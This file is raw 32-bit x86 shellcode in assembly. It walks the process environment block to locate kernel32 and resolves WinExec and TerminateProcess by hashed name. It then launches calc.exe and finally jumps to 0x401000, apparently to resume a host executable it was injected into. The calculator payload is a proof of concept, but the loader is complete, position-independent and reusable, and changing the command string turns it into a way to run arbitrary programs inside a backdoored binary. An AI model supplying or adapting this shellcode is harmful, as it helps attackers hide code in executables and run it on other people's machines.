BITS 32
start:

   mov   ebp, esp                  ;     prologue
   sub   esp, 0x1000           ;     Add space int ESP to avoid clobbering
   sub   ebp, 0x2000
   pushad


 find_kernel32:                       
   xor   ecx, ecx                  ;     ECX = 0
   mov   esi,fs:[ecx+0x30]         ;     ESI = &(PEB) ([FS:0x30])
   mov   esi,[esi+0x0C]            ;     ESI = PEB->Ldr
   mov   esi,[esi+0x1C]            ;     ESI = PEB->Ldr.InInitOrder

 next_module:                         
   mov   ebx, [esi+0x08]           ;     EBX = InInitOrder[X].base_address
   mov   edi, [esi+0x20]           ;     EDI = InInitOrder[X].module_name
   mov   esi, [esi]                ;     ESI = InInitOrder[X].flink (next)
   cmp   [edi+12*2], cx            ;    (unicode) modulename[12] == 0x00 ?
   jne   next_module               ;     No: try next module

 find_function_shorten:               
   jmp find_function_shorten_bnc   ;     Short jump

 find_function_ret:                   
   pop esi                         ;     POP the return address from the stack
   mov   [ebp+0x04], esi           ;     Save find_function address for later usage
   jmp resolve_symbols_kernel32    ;

 find_function_shorten_bnc:              
   call find_function_ret          ;     Relative CALL with negative offset

 find_function:                       
   pushad                          ;     Save all registers

   mov   eax, [ebx+0x3c]           ;     Offset to PE Signature
   mov   edi, [ebx+eax+0x78]       ;     Export Table Directory RVA
   add   edi, ebx                  ;     Export Table Directory VMA
   mov   ecx, [edi+0x18]           ;     NumberOfNames
   mov   eax, [edi+0x20]           ;     AddressOfNames RVA
   add   eax, ebx                  ;     AddressOfNames VMA
   mov   [ebp-4], eax              ;     Save AddressOfNames VMA for later

 find_function_loop:                  
   jecxz find_function_finished    ;     Jump to the end if ECX is 0
   dec   ecx                       ;     Decrement our names counter
   mov   eax, [ebp-4]              ;     Restore AddressOfNames VMA
   mov   esi, [eax+ecx*4]          ;     Get the RVA of the symbol name
   add   esi, ebx                  ;     Set ESI to the VMA of the current symbol name

 compute_hash:                        
   xor   eax, eax                  ;     NULL EAX
   cdq                             ;     NULL EDX
   cld                             ;     Clear direction

 compute_hash_again:                  
   lodsb                           ;     Load the next byte from esi into al
   test  al, al                    ;     Check for NULL terminator
   jz    compute_hash_finished     ;     If the ZF is set, we've hit the NULL term
   ror   edx, 0x0d                 ;     Rotate edx 13 bits to the right
   add   edx, eax                  ;     Add the new byte to the accumulator
   jmp   compute_hash_again        ;     Next iteration

 compute_hash_finished:              

 find_function_compare:              
   cmp   edx, [esp+0x24]           ;     Compare the computed hash with the requested hash
   jnz   find_function_loop        ;     If it doesn't match go back to find_function_loop
   mov   edx, [edi+0x24]           ;     AddressOfNameOrdinals RVA
   add   edx, ebx                  ;     AddressOfNameOrdinals VMA
   mov   cx,  [edx+2*ecx]          ;     Extrapolate the function's ordinal
   mov   edx, [edi+0x1c]           ;     AddressOfFunctions RVA
   add   edx, ebx                  ;     AddressOfFunctions VMA
   mov   eax, [edx+4*ecx]          ;     Get the function RVA
   add   eax, ebx                  ;     Get the function VMA
   mov   [esp+0x1c], eax           ;     Overwrite stack version of eax from pushad

 find_function_finished:              
   popad                           ;     Restore registers
   ret                             ;  

 resolve_symbols_kernel32:          
  push 0xe8afe98                  ;     WinExec hash
  call dword [ebp+0x04]       ;     Call find_function
  mov   [ebp+0x10], eax           ;     Save WinExec address for later usage
  push 0x78b5b983                 ;     TerminateProcess hash
  call dword  [ebp+0x04]       ;     Call find_function
  mov   [ebp+0x14], eax           ;     Save TerminateProcess address for later usage

 create_calc_string:                  
  xor eax, eax                   ;      EAX = null
  push eax                       ;      Push null-terminated string
  push dword 0x6578652e		       ;          
  push dword 0x636c6163          ;     
  push esp                       ;      ESP = &(lpCmdLine)
  pop  ebx                       ;      EBX save pointer to string 

 ; UINT WinExec(
 ; LPCSTR lpCmdLine, -> EBX
 ; UINT   uCmdShow 	 -> EAX
 ; );

 call_winexec:                        
	xor eax, eax                   ;    EAX = null
	push eax                       ;    uCmdShow
	push ebx                       ;    lpCmdLine
	call dword [ebp+0x10]      ;    Call WinExec

    add esp, 0x1000
    add ebp, 0x2000
    popad
	push 0x401000
	ret